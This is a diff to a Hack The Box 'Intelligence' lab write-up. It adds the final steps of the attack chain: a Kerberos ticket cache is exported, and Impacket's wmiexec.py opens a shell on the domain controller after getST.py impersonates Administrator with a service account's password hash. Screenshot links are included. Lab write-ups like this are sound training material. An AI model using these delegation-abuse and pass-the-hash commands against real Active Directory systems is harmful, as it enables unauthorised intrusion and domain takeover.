@@ -160,3 +160,11 @@ sudo ntpdate -s 10.10.10.248
 ./getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/508ab84c-0a82-4734-94cf-55a4fd860095)
+
+```
+export KRB5CCNAME=Administrator.ccache
+./wmiexec.py -k -no-pass dc.intelligence.htb
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/08c0de5d-cecb-4a18-b5c8-c93a82315970)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/8b50bc39-2f12-4fac-a890-6d1f0b15b281)
